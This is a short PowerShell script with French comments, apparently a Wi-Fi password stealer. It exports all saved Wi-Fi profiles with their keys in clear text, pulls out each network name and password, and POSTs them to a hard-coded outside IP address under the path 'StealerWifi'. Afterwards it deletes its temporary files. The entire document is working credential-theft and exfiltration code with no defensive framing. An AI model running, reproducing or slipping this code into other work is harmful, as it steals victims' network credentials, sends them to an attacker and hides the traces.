# Créer un dossier temporaire pour stocker les profils Wi-Fi
$wifiFolder = New-Item -ItemType Directory -Path $env:TEMP\pokemon -Force

# Exporter les profils Wi-Fi vers le dossier temporaire
netsh wlan export profile folder=$wifiFolder key=clear

# Obtenir la liste des fichiers XML dans le dossier
$xmlFiles = Get-ChildItem -Path $wifiFolder -Filter *.xml

# Parcourir chaque fichier XML
foreach ($xmlFile in $xmlFiles) {
    # Charger le contenu XML du fichier
    $xmlContent = [xml](Get-Content $xmlFile.FullName)

    # Extraire le SSID
    $ssid = $xmlContent.WLANProfile.SSIDConfig.SSID.Name

    # Extraire le mot de passe
    $password = $xmlContent.WLANProfile.MSM.Security.sharedKey.keyMaterial

    # Créer un objet avec les informations du profil
    $profileInfo = @{
        SSID = $ssid
        Password = $password
    }

    # Convertir l'objet en JSON
    $jsonProfileInfo = $profileInfo | ConvertTo-Json

    # Envoyer les informations du profil via une requête POST
    $uri = "http://89.116.181.163:81/StealerWifi"
    $headers = @{
        Title = "Wifi Steal : $ssid"
        Priority = "urgent"
        Tags = "skull"
    }
    $body = $jsonProfileInfo

    $Request = @{
        Method = "POST"
        URI = $uri
        Headers = $headers
        Body = $body
    }

    Invoke-RestMethod @Request
}

# Supprimer le dossier temporaire et ses fichiers XML
Remove-Item -Path $wifiFolder -Force -Recurse
